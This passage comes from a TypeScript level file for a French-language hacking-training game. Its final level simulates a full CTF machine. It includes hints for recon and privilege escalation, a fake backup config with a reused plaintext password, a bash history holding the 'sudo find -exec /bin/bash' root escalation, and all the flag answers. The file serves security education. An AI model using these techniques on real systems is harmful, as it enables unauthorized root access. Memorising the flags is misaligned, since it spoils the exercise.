    validation: [
      { type: 'command', value: 'cat /.dockerenv', description: 'Détecter l\'environnement Docker' },
      { type: 'command', value: 'bash container_check.sh', description: 'Exécuter le script de détection container' }
    ],
    story: "🐳 Tu te retrouves dans un shell. Où es-tu exactement ? Machine physique ? VM ? Container Docker ? Ça change tout pour la suite."
  },
  {
    id: 100,
    title: "CTF FINAL — Machine complète",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Chaîne complète : recon → foothold web → privesc → root → 3 flags",
    description: "La machine finale. Trois flags à capturer. **Flag 1** : dans les headers HTTP ou un fichier web exposé. **Flag 2** : après accès SSH avec les credentials trouvés. **Flag 3** : après élévation de privilèges vers root. Chaque flag vaut des points.",
    commands: ['nmap', 'curl', 'cat', 'find', 'sudo', 'grep', 'ssh'],
    hints: [
      "Flag 1 : inspecte les headers HTTP (`curl -I`) et le code source. Cherche dans `/robots.txt` et `/.git`.",
      "Flag 2 : les credentials sont peut-être dans un fichier de config ou dans l'historique bash.",
      "Flag 3 : `sudo -l` en premier. Sinon `find / -perm -4000`. GTFOBins pour l'exploitation."
    ],
    fileSystem: {
      'web_root': {
        'index.html': `<!DOCTYPE html>
<html>
<head><title>MegaCorp Internal Portal</title></head>
<!-- FLAG{w3b_s0urc3_1nsp3ct10n_101} -->
<body><h1>Welcome</h1></body>
</html>`,
        'robots.txt': `User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /.git/
# FLAG{r0b0ts_txt_1s_n0t_4_s3cr3t}`,
        'backup': {
          'db_config.php.bak': `<?php
$db_host = "localhost";
$db_name = "megacorp_prod";
$db_user = "admin";
$db_pass = "MegaC0rp2024!";
// SSH creds: student / MegaC0rp2024! (same password reuse)
?>`,
        },
        '.git': {
          'config': '[core]\n\trepositoryformatversion = 0'
        }
      },
      'home': {
        'student': {
          '.bash_history': `ls -la
cat /etc/passwd
sudo -l
sudo find . -exec /bin/bash \\; -quit
cat /root/flag3.txt`,
          'notes.txt': 'Remember: same password for SSH and DB. TODO: change this!'
        }
      },
      'root': {
        'flag3.txt': 'FLAG{r00t_0wn3d_pr1v3sc_v14_sud0_f1nd}'
      }
    },
    validation: [
      { type: 'command', value: 'cat web_root/robots.txt', description: 'Flag 1 — robots.txt' },
      { type: 'command', value: 'cat web_root/backup/db_config.php.bak', description: 'Flag 2 — credentials en backup' },
      { type: 'command', value: 'cat root/flag3.txt', description: 'Flag 3 — root compromise' }
    ],
    story: "🏆 MACHINE FINALE — 100 niveaux parcourus. Recon, foothold, post-exploitation, privesc. Tu as tout appris. Maintenant prouve-le. Trois flags. Bonne chance, hacker."
  }
];

export const getDifficultyColor = (difficulty: Level['difficulty']) => {
  switch (difficulty) {
    case 'beginner':
      return 'text-green-500';
    case 'intermediate':
      return 'text-yellow-500';
    case 'advanced':
      return 'text-red-500';
    default:
      return 'text-gray-500';
  }
};

export const getDifficultyEmoji = (difficulty: Level['difficulty']) => {
  switch (difficulty) {
    case 'beginner':
      return '🟢';
    case 'intermediate':
      return '🟡';
    case 'advanced':
      return '🔴';
    default:
      return '⚪';
  }
};

